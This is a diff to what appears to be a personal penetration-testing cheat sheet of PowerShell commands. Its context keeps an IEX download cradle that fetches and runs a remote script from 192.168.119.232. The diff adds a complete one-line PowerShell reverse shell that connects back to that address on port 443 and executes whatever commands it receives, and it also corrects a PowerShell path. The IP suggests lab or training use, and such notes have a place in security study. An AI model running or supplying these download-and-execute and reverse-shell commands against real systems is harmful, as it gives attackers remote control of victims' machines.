@@ -15,7 +15,8 @@ https://medium.com/swlh/fun-with-powershell-payload-execution-and-evasion-f5051f
 # Invoke Expressions (IEX)
 IEX(New-Object Net.WebClient).downloadString('http://192.168.119.232/Invoke-PowershellTcp.ps1')
 
-
+# Reverse powershell
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.119.232',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 
 - ---] Enumeration
 =====================
@@ -47,4 +48,4 @@ C:\Windows\SysWow64
 C:\Windows\System32
 
 # Full path to x64-bit powershell
-C:\Windows\SysNative\WindowsPowershell\v1.9\Powershell.exe 
+C:\Windows\SysNative\WindowsPowershell\v1.0\Powershell.exe 
